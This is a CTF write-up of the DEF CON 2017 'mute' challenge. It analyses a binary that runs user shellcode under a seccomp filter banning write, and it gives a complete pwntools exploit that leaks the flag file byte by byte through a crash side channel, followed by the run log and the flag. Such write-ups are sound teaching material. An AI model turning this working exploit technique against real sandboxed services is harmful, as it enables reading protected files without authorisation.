---
title: "Potent Pwnables) mute"
sidebar_position: 1
---
## **Information**

### **Description**
```
Hush, you.

mute\_9c1e11b344369be9b6ae0caeec20feb8.quals.shallweplayaga.me 443

Files <https://2017.notmalware.ru/1945c04a342d1d860859c2f35083a276f57f1d31/mute>
```
### **File**

* [mute](/attachments/1147556/1147555.bin)

### **Source Code**

* <https://github.com/legitbs/quals-2017/tree/master/mute>

## **Writeup**

### File information

```bash title="File information"  
lazenca0x0@ubuntu:~/CTF/DEFCON2017/mute$ file mute
mute: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=3c37c5241fad4af47c79288b1f0aea4b63418e86, not stripped
lazenca0x0@ubuntu:~/CTF/DEFCON2017/mute$ checksec.sh --file mute
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   mute
lazenca0x0@ubuntu:~/CTF/DEFCON2017/mute$
```

### **Binary analysis**

#### **Main**

* **This function performs the following operations:**
  + Allocates a 4096-byte RWX memory region using `mmap()`.
  + Invokes `dropSyscalls()` to establish restrictive seccomp filtering.
  + Reads 4096 bytes from standard input into the allocated buffer.
  + Jumps directly to `buf` to execute user-supplied shellcode.

```c title="main"
int __cdecl main(int argc, const char **argv, const char **envp)
{
  void *v3; // rsi@1
  FILE *v4; // rdi@1
  int len; // [rsp+14h] [rbp-Ch]@1
  void *buf; // [rsp+18h] [rbp-8h]@1

  len = 0;
  v3 = (void *)4096;
  buf = mmap(0LL, 0x1000uLL, 7, 34, -1, 0LL);//mmap(NULL, 4096, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) 
  puts("SILENCE, FOUL DAEMON!");
  v4 = _bss_start;
  fflush(_bss_start);
  dropSyscalls();
  while ( len != 0x1000 )
  {
    v3 = buf;
    v4 = 0LL;
    len += read(0, buf, 0x1000 - len);
  }
  ((void (__fastcall *)(FILE *, void *))buf)(v4, v3);
  return 0;
}
```

#### **dropSyscalls()**

* **This function installs seccomp sandbox rules:**
  + Initializes seccomp with `seccomp_init()`, sets architecture with `seccomp_arch_add()`, and commits rules with `seccomp_load()`.
  + Noticeably, `write` (`sys_write = 1`) is disallowed (hence the name "mute").

```c title="dropSyscalls"
__int64 dropSyscalls()
{
  ctx = seccomp_init(0LL);
  if ( !ctx )
  {
    seccomp_reset(ctx, 0LL);
    _exit(-1);
  }
  seccomp_arch_add(ctx, 0xC000003ELL);          // SCMP_ARCH_X86_64
  addRule(0);
  addRule(2u);
  addRule(3u);
  addRule(4u);
  addRule(5u);
  addRule(6u);
  addRule(7u);
  addRule(8u);
  addRule(9u);
  addRule(0xAu);
  addRule(0xBu);
  addRule(0xCu);
  addRule(0x3Bu);
  return seccomp_load(ctx);
}
```

#### **addRule()**

```c title="addRule"
__int64 __fastcall addRule(unsigned int syscall)
{
  __int64 rc; // rax@1

  rc = seccomp_rule_add(ctx, 0x7FFF0000LL, syscall, 0LL);// SCMP_ACT_ALLOW
  if ( (_DWORD)rc )
    _exit(-syscall);
  return rc;
}
```

* **Permitted System Calls:**

| rax | System call | rax | System call |
| --- | --- | --- | --- |
| 0 | `sys_read` | 8 | `sys_lseek` |
| 2 | `sys_open` | 9 | `sys_mmap` |
| 3 | `sys_close` | 0xA | `sys_mprotect` |
| 4 | `sys_stat` | 0xB | `sys_munmap` |
| 5 | `sys_fstat` | 0xC | `sys_brk` |
| 6 | `sys_lstat` | 0x3B | `sys_execve` |
| 7 | `sys_poll` |  |  |

### Structure of Exploit code

:::note
* Because `sys_write` is banned, we leak the flag byte-by-byte via a side-channel oracle:
  + Read the flag file into memory using `open("./flag")` and `read()`.
  + Compare the flag character at index `location` with guessed byte `sil`.
  + If equal (`je fin`), jump to terminate cleanly or trigger exit.
  + If unequal (`jmp again`), loop back to trigger additional reads, causing connection behavior difference / crash oracle.
:::

### **Information for attack**

#### **Shellcode**

* Construct the side-channel verification shellcode:

```python title="Shellcode"
from pwn import *

shellcode = asm('''
    cmp     r15, 0x0
    ja      load
    mov     r15, rbp
    mov     r14, rsp
    sub     r14, 0x838

load:
''')

shellcode += asm(shellcraft.amd64.linux.open('./flag'))
shellcode += asm(shellcraft.amd64.linux.read('rax', 'r14', count=flagLen))
shellcode += asm('''
    xor     rsi, rsi
    mov     sil, ''' + hex(ch) + '''
    cmp     [r14+''' + hex(location) + '''], sil
    je fin
    jmp again

again:
    mov [rbp-0xc], ebx
    mov r12, 0x400B0B
    jmp r12
 
fin:
    mov r12, 0x400B45
    jmp r12
''')
```

## **Exploit Code**

```python title="Exploit Code"
from pwn import *

context.arch = 'amd64'

flag = ''
flagLen = 120
prog = log.progress('Searching...')

for location in range(0, flagLen):
	p = process('./mute')
	p.recvline()

	for ch in range(32, 127):
		shellcode = asm('''
			cmp     r15, 0x0
			ja      load
			mov     r15, rbp
			mov 	r14, rsp
			sub 	r14, 0x838

			load:
		''')
		shellcode += asm(shellcraft.amd64.linux.open('./flag'))
		shellcode += asm(shellcraft.amd64.linux.read('rax', 'r14', count=flagLen))
		shellcode += asm('''
			xor     rsi, rsi
			mov     sil, ''' + hex(ch) + '''
			cmp     [r14+''' + hex(location) + '''], sil
			je fin
			jmp again

			again:
			mov [rbp-0xc], ebx
			mov r12, 0x400B0B
			jmp r12
		 
			fin:
			mov r12, 0x400B45
			jmp r12
		''')
		
		try:
			p.send(shellcode.ljust(4096, "\x00"))
		except:		
			flag += chr(ch - 0x1)
			log.info('Flag : ' + flag)
			p.close()
			break

prog.success('Done!')
log.info('Flag : ' + flag)
```

```sh title="Flag"
...

[*] Flag : The flag is: I thought what I'd do was, I'd pretend I was one of those deaf mutes d9099cd0d3e6cb47fe3a9b0e6319
[+] Starting local process './mute': pid 127140
[*] Process './mute' stopped with exit code -31 (SIGSYS) (pid 127140)
[*] Flag : The flag is: I thought what I'd do was, I'd pretend I was one of those deaf mutes d9099cd0d3e6cb47fe3a9b0e63190
[+] Starting local process './mute': pid 127502
[*] Process './mute' stopped with exit code -31 (SIGSYS) (pid 127502)
[*] Flag : The flag is: I thought what I'd do was, I'd pretend I was one of those deaf mutes d9099cd0d3e6cb47fe3a9b0e631901
[+] Starting local process './mute': pid 127884
[*] Process './mute' stopped with exit code -31 (SIGSYS) (pid 127884)
[*] Flag : The flag is: I thought what I'd do was, I'd pretend I was one of those deaf mutes d9099cd0d3e6cb47fe3a9b0e631901f
[+] Starting local process './mute': pid 129326
[*] Process './mute' stopped with exit code -31 (SIGSYS) (pid 129326)
[*] Flag : The flag is: I thought what I'd do was, I'd pretend I was one of those deaf mutes d9099cd0d3e6cb47fe3a9b0e631901fa
[+] Starting local process './mute': pid 130668
[+] Starting local process './mute': pid 2081
[+] Starting local process './mute': pid 4014
[+] Starting local process './mute': pid 5917
[+] Starting local process './mute': pid 7819
[+] Starting local process './mute': pid 9721
[*] Flag : The flag is: I thought what I'd do was, I'd pretend I was one of those deaf mutes d9099cd0d3e6cb47fe3a9b0e631901fa
[*] Stopped process './mute' (pid 9721)
[*] Stopped process './mute' (pid 7819)
[*] Stopped process './mute' (pid 5917)
[*] Stopped process './mute' (pid 4014)
[*] Stopped process './mute' (pid 2081)
[*] Stopped process './mute' (pid 130668)
lazenca0x0@ubuntu:~/CTF/DEFCON2017/mute$
```

## **Flag**

|  |  |
| --- | --- |
| Flag | The flag is: I thought what I'd do was, I'd pretend I was one of those deaf mutes d9099cd0d3e6cb47fe3a9b0e631901fa |

## **Related Site**

* <https://bannsecurity.com/index.php/home/10-ctf-writeups/41-defcon-2017-mute>
* <http://man7.org/linux/man-pages/man3/seccomp_init.3.html>
* <http://man7.org/linux/man-pages/man3/seccomp_arch_add.3.html>
* <http://man7.org/linux/man-pages/man3/seccomp_rule_add.3.html>
* <http://man7.org/linux/man-pages/man3/seccomp_load.3.html>
* <http://man7.org/linux/man-pages/man2/seccomp.2.html>
* <https://ocw.cs.pub.ro/courses/cns/labs/lab-07>